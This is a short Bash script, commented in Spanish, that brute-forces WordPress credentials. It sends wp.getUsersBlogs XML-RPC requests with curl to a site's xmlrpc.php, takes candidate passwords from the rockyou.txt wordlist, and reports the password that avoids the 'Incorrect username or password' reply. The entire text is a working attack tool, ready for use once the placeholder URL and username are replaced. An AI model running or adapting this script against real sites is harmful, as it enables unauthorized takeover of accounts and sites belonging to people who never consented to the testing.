#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        exit 1
}


trap ctrl_c SIGINT

function createXML(){
        password=$1

        #Cambiar ejemplo por el usuario al que queramos hacer la fuerza bruta

        xmlFILE="""
        <?xml version=\"1.0\" encoding=\"UTF-8\"?>
        <methodCall> 
        <methodName>wp.getUsersBlogs</methodName> 
        <params> 
        <param><value>ejemplo</value></param>  
        <param><value>$password</value></param> 
        </params> 
        </methodCall>
        """

        echo $xmlFILE > file.xml

        # Poner la url de el wordpress
        
        response=$(curl -s -X POST "http://{Poner_URL}/xmlrpc.php" -d@file.xml)

        if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
                echo -e "La contraseña para el usuario Proporcionado es: $password"
                exit 0
        fi
}


cat /usr/share/wordlists/rockyou.txt | while read password; do
        createXML $password
done